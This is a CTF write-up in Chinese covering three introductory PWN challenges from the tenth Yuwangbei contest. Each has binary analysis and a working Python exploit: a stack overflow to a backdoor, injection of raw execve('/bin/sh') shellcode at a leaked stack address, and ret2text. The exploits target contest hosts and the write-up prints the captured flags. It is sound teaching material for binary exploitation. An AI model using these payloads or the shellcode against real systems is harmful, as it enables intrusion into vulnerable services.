---
title: "第十届御网杯 PWN 题解合集"
date: "2026-05-30"
description: "第十届御网杯 CTF 竞赛 PWN 方向三道题目的详细题解，涵盖栈溢出、ret2backdoor、shellcode 注入等经典利用手法。"
tags: ["CTF", "PWN", "御网杯", "Writeup"]
cover: "https://raw.githubusercontent.com/kings-well-byte/images/main/eb35bf8773ba9c7504099778b150e5df.jpg"
---

# 第十届御网杯 PWN 题解合集

> **比赛时间**：2026-05-30  
> **方向**：PWN (Binary Exploitation)  
> **总体难度**：Easy  
> **涉及知识点**：栈溢出、ret2backdoor、栈地址泄露、Shellcode 注入、ret2text、栈对齐

---

## 目录

- [PWN-Authenticate](#pwn-authenticate--ret2backdoor) — 栈溢出 + ret2backdoor
- [PWN-MessageBoard](#pwn-messageboard--栈地址泄露--shellcode) — 栈地址泄露 + Shellcode
- [PWN-NoteService](#pwn-noteservice--ret2text) — 栈溢出 + ret2text

---

# PWN-Authenticate — ret2backdoor

## 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN |
| 难度 | Easy |
| 考点 | 栈溢出、ret2backdoor、栈对齐 |

## 题目分析

这是一道经典的**栈溢出入门题**。程序实现了一个简单的用户认证系统，但在 `login` 函数中使用了危险的 `gets()` 函数读取用户输入的密码。

`gets()` 函数不会检查输入长度，因此可以向固定大小的栈缓冲区写入任意长度的数据，造成**栈缓冲区溢出**（Stack Buffer Overflow）。

更幸运的是，程序中自带了一个 `backdoor` 函数，直接调用了 `system("/bin/sh")`。这意味着我们不需要自己构造复杂的 ROP 链，只需要将函数的返回地址覆盖为 `backdoor` 函数的地址即可拿到 shell。

### 保护机制检查

```bash
$ checksec authenticate
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- **No PIE**：程序基地址固定，无需泄露即可直接跳转到后门函数
- **No Canary**：没有栈保护，可以任意覆盖返回地址
- **NX enabled**：栈不可执行，但本题不需要在栈上执行代码

### 关键代码分析

`login` 函数伪代码：

```c
void login() {
    char password[128];      // rbp-0x80
    printf("Password: ");
    gets(password);          // 危险！无长度限制
    if (strcmp(password, "admin") == 0) {
        puts("Access granted.");
    } else {
        puts("Invalid credentials.");
    }
}
```

`backdoor` 函数地址：`0x4011f6`

### 溢出偏移计算

在 64 位程序中，栈帧布局如下：

```
高地址
+------------------+
|  返回地址 (rip)   |  ← rbp + 8
+------------------+
|  旧 rbp 值       |  ← rbp
+------------------+
|  password[127]   |  ← rbp - 0x80
|      ...         |
|  password[0]     |
+------------------+
低地址
```

- 缓冲区大小：`0x80` = **128 字节**
- 覆盖 saved rbp 需要：**8 字节**
- 到达返回地址总偏移：**128 + 8 = 136 字节**

### 栈对齐问题

64 位程序调用 `system()` 时需要满足 **16 字节栈对齐**（RSP 的最低位必须是 0）。如果直接跳转到 `backdoor` 函数，由于 `call` 指令会压入 8 字节的返回地址，导致栈不对齐，可能触发 `movaps` 指令崩溃。

解决方法：在 `backdoor` 地址前插入一个 **ret gadget**（如 `0x40101a`），先执行一次 `ret` 调整栈指针，再跳转到后门函数。

## Exploit

```python
import struct, socket, time

HOST = '120.27.146.76'
PORT = 27262

backdoor = 0x4011f6
ret = 0x40101a   # ret gadget，用于 16 字节栈对齐

# 填充 136 字节到达返回地址
payload = b'A' * 136
# 栈对齐 + 跳转到后门
payload += struct.pack('<Q', ret)
payload += struct.pack('<Q', backdoor)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((HOST, PORT))

time.sleep(1)
s.recv(4096)            # "=== Welcome to SecureAuth System ===\nUsername: "
s.send(b'admin\n')
time.sleep(0.5)
s.recv(4096)            # "Password: "
s.send(payload + b'\n')
time.sleep(0.5)
s.recv(4096)            # "Invalid credentials.\n"

# 拿到 shell，读取 flag
time.sleep(0.5)
s.send(b'cat /flag*\n')
time.sleep(1)
print(s.recv(4096).decode())
s.close()
```

## Flag

```
flag{eb894509110dfe178dfe94d828d9d15c}
```

---

# PWN-MessageBoard — 栈地址泄露 + Shellcode

## 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN |
| 难度 | Easy |
| 考点 | 栈地址泄露、Shellcode 注入、栈可执行 |

## 概述

留言板程序泄露了栈上 buffer 地址，且栈可执行（NX 未开启）。利用 `read()` 的栈溢出覆盖返回地址跳转到 buffer 上的 shellcode，获取 shell。

## 解题过程

### Step 1: 分析二进制

程序为 64 位 ELF，无 PIE、无 Canary、栈可执行（GNU_STACK RWE）。

`vuln()` 函数逻辑：
1. 打印 `Buffer at: %p` 泄露栈上 buffer 地址
2. 调用 `read(0, buf, 0x100)` — buffer 大小仅 0x80，溢出 0x80 字节

溢出偏移：buffer 在 `rbp-0x80`，返回地址在 `rbp+8`，总偏移 = 0x80 + 8 = 136 字节。

### Step 2: 编写 Exploit

将 shellcode 放在 buffer 开头，NOP 填充至 136 字节后覆盖返回地址为泄露的 buffer 地址，跳转执行 shellcode。

```python
import socket
import struct
import time

HOST = '120.27.146.76'
PORT = 19743

# x86-64 execve("/bin/sh", NULL, NULL) shellcode
shellcode = (
    b"\x48\x31\xf6"              # xor rsi, rsi
    b"\x56"                      # push rsi
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # movabs rdi, '/bin//sh'
    b"\x57"                      # push rdi
    b"\x54"                      # push rsp
    b"\x5f"                      # pop rdi
    b"\x48\x31\xd2"              # xor rdx, rdx
    b"\x6a\x3b"                  # push 59
    b"\x58"                      # pop rax
    b"\x0f\x05"                  # syscall
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

data = b""
while b"Buffer at:" not in data:
    data += s.recv(4096)

idx = data.find(b"Buffer at: ")
after = data[idx + len(b"Buffer at: "):]
leak = int(after[:after.find(b"\n")].strip(), 16)
print(f"[+] Buffer address: {hex(leak)}")

while b"Message:" not in data:
    data += s.recv(4096)

offset = 0x80 + 8
payload = shellcode + b"\x90" * (offset - len(shellcode)) + struct.pack("<Q", leak)
s.send(payload)

time.sleep(0.5)
s.send(b"cat /flag*\n")
time.sleep(1)
print(s.recv(4096).decode(errors='replace'))
s.close()
```

## Flag

```
flag{5e76f1da370f72f3dbac204eade3f3b7}
```

---

# PWN-NoteService — ret2text

## 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN |
| 难度 | Easy |
| 考点 | 栈溢出、ret2text、栈对齐 |

## Summary

笔记服务程序存在栈溢出漏洞，`vuln` 函数使用 `read` 读取 256 字节到 64 字节的栈缓冲区。程序自带后门函数 `secret_note` 直接调用 `system("/bin/sh")`，通过 ret2text 技术覆盖返回地址即可获取 shell。

## Solution

### Step 1: 分析二进制

程序为 64 位 ELF，NX 开启。关键函数：

- `vuln`（0x4011ad）：`sub rsp, 0x40` 分配 64 字节缓冲区，`read(0, buf, 0x100)` 读入 256 字节，溢出 192 字节
- `secret_note`（0x401196）：直接执行 `system("/bin/sh")`

溢出偏移 = 0x40（缓冲区）+ 8（saved rbp）= 72 字节到返回地址。

### Step 2: 构造 payload 获取 shell

64 位下调用 `system` 需要 16 字节栈对齐，在返回地址前插入一个 `ret` gadget（0x4010e4）即可。

```python
import socket
import struct
import time

def p64(x):
    return struct.pack('<Q', x)

host = '47.99.147.34'
port = 10858

secret_note = 0x401196
ret_gadget = 0x4010e4

# 72 bytes padding + ret gadget (alignment) + backdoor address
payload = b'A' * (0x40 + 8)
payload += p64(ret_gadget)
payload += p64(secret_note)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

time.sleep(0.5)
s.recv(4096)

s.send(payload + b'\n')
time.sleep(0.5)
s.recv(4096)

s.send(b'cat /flag\n')
time.sleep(0.5)
print(s.recv(4096).decode())

s.close()
```

运行后直接获得 flag。

## Flag

```
flag{db35a83bde913ee94d6a7200849bb08a}
```

---

## 三题对比总结

| 题目 | 溢出函数 | 利用方式 | 特殊条件 |
|------|---------|---------|---------|
| **Authenticate** | `gets()` | ret2backdoor | 需栈对齐 |
| **MessageBoard** | `read()` | Shellcode 注入 | 栈可执行 + 地址泄露 |
| **NoteService** | `read()` | ret2text | 需栈对齐 |

> **后记**：这三道题都是 PWN 方向的入门经典题，涵盖了栈溢出最基础的利用方式。熟练掌握这些基础后，可以进一步学习 ROP 链构造、格式化字符串、堆利用等进阶技术。
